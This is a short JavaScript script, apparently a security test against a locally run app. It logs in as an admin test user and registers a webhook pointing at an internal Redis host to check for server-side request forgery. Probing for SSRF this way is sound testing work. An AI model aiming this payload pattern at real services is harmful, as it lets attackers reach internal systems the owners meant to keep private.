const { usersA } = require('../helper.js');

async function attack() {
  const tokenReq = await fetch('http://localhost:8080/api/v1/auth/login', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ email: usersA.ADMIN.email, password: 'password123' })
  });
  const { access_token: token } = await tokenReq.json();

  // Attack: Try SSRF on webhook creation by pointing it to an internal redis service
  const postReq = await fetch(`http://localhost:8080/api/v1/api-platform/webhooks`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${token}` },
    body: JSON.stringify({
      url: "http://redis:6379",
      secret: "secret123",
      events: ["driver.created"]
    })
  });
  console.log("WEBHOOK SSRF:", await postReq.status, await postReq.text());
}
attack();
